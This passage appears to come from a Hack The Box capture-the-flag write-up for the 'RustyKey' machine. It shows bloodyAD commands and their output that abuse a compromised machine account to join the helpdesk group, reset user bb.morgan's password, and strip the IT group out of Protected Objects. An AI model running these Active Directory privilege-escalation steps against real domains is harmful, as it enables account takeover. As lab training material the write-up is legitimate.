## Auth as bb.morgan

FIrst, add 'IT-COMPUTER3$' as a member of `HELPESK` group.

```shell
┌──(elodvk㉿kali)-[~/hack-the-box/RustyKey]
└─$ bloodyAD --kerberos --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' add groupMember helpdesk 'IT-COMPUTER3$'
[+] IT-COMPUTER3$ added to helpdesk

```

Then set a new password for `bb.morgan`

```shell
┌──(elodvk㉿kali)-[~/hack-the-box/RustyKey]
└─$ bloodyAD --kerberos --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password bb.morgan 'Welcome@123'    
[+] Password changed successfully!

```

bb.morgan is a member of IT group, which is a member of protected objects group. Protected Objects group is a member of Protected Users group. So, I will now remove IT group from Protected Obhjects group.

```shell
┌──(elodvk㉿kali)-[~/hack-the-box/RustyKey]
└─$ bloodyAD --kerberos --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB' IT       
[-] IT removed from CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB

```
